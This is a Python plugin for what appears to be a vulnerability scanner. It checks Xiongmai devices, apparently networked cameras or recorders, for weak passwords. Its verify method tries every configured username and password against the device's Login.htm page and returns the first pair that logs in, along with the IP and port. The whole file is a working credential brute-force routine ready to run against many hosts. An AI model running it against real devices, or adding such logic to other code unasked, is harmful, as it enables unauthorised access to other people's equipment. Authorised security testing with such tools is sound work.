import requests
from loguru import logger

from .base import POCTemplate


class XioingmaiWeakPassword(POCTemplate):

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['xiongmai']
        self.product_version = ''
        self.ref = ''
        self.level = POCTemplate.level.low
        self.desc = 'Xiongmai 弱口令'

    def verify(self, ip, port=80):
        headers = {'Connection': 'close', 'User-Agent': self.config.user_agent}
        for user in self.config.users:
            for password in self.config.passwords:
                url = f"http://{ip}:{port}/Login.htm"
                data = {
                    'command': 'login',
                    'username': user,
                    'password': password
                }
                try:
                    r = requests.get(url, headers=headers, data=data, verify=False, timeout=self.config.timeout)
                    if r.status_code == 200 and 'failed' not in r.text:
                    # if r.status_code == 200 and len(r.text) > 5000:
                        return ip, str(port), self.product, user, password, self.name
                except Exception as e:
                    logger.error(e)
        return None

    def exploit(self, results):
        pass


POCTemplate.register_poc(XioingmaiWeakPassword)